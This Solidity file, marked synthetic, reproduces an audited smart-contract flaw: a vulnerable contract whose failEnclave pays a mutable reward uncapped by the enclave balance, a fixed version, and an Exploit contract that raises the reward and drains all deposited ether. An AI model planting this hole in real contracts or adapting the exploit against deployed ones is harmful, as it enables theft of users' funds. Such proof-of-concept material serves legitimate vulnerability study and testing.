// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Switchboard — queue.reward can be raised after an enclave is funded, then
    failEnclave pays that reward out of the diamond (OtterSec, finding 47980).
    SYNTHETIC, cheatcode-free. The attacker updates an enclave while the reward
    is 0, raises queue.reward to the diamond's whole balance (other users' ETH),
    and failEnclave transfers it. The payout is not capped by the enclave
    balance. @> VULN marks that transfer.
    The diamond's ETH is the victim deposit. Forge deals it before run(); the
    Playground fundWei step does the same. */

contract Diamond {
    uint256 public queueReward;
    mapping(address => uint256) public enclaveBalance;
    mapping(address => bool) public verified;
    mapping(address => bool) public failed;
    address public constant victimEnclave = address(0xBEEF);

    constructor() {
        enclaveBalance[victimEnclave] = 10 ether;
    }

    receive() external payable {}

    function updateEnclave(address enclaveId) external payable {
        if (msg.value < queueReward) revert("InsufficientBalance");
        enclaveBalance[enclaveId] += msg.value;
    }

    function forceOverrideVerify(address enclaveId) external {
        verified[enclaveId] = true;
    }

    function setAttestationQueueConfig(uint256 newReward) external {
        queueReward = newReward;
    }

    function failEnclave(address verifierId, address enclaveId) external {
        require(verified[verifierId], "verifier");
        verifierId;
        failed[enclaveId] = true;
        if (queueReward > 0) {
            payable(msg.sender).transfer(queueReward); // @> VULN: pays the mutable queue reward even when it exceeds the enclave balance
        }
    }
}

contract DiamondFixed {
    uint256 public queueReward;
    mapping(address => uint256) public enclaveBalance;
    mapping(address => bool) public verified;
    address public constant victimEnclave = address(0xBEEF);

    constructor() {
        enclaveBalance[victimEnclave] = 10 ether;
    }

    receive() external payable {}

    function updateEnclave(address enclaveId) external payable {
        if (msg.value < queueReward) revert("InsufficientBalance");
        enclaveBalance[enclaveId] += msg.value;
    }

    function forceOverrideVerify(address enclaveId) external {
        verified[enclaveId] = true;
    }

    function setAttestationQueueConfig(uint256 newReward) external {
        queueReward = newReward;
    }

    function failEnclave(address verifierId, address enclaveId) external {
        require(verified[verifierId], "verifier");
        uint256 owed = enclaveBalance[enclaveId];
        if (queueReward > owed) revert("reward exceeds enclave balance");
        if (owed > 0) payable(msg.sender).transfer(owed);
    }
}

contract Exploit {
    Diamond public diamond; // nonce 1
    address public enclave;

    constructor() {
        diamond = new Diamond();
        enclave = address(this);
    }

    receive() external payable {}

    function run() external {
        require(address(diamond).balance == 10 ether, "victim ETH is in the diamond");
        require(diamond.enclaveBalance(diamond.victimEnclave()) == 10 ether, "victim enclave is funded");
        require(diamond.queueReward() == 0, "queue reward starts at zero");
        diamond.updateEnclave{value: 0}(enclave);
        require(diamond.enclaveBalance(enclave) == 0, "attacker enclave posted no ETH");
        diamond.forceOverrideVerify(enclave);
        uint256 bal = address(diamond).balance;
        diamond.setAttestationQueueConfig(bal);
        require(diamond.queueReward() == 10 ether, "reward raised to the full balance");
        diamond.failEnclave(enclave, enclave);
        require(address(this).balance == 10 ether, "attacker received the diamond balance");
        require(address(diamond).balance == 0, "victim ETH is gone");
    }
}
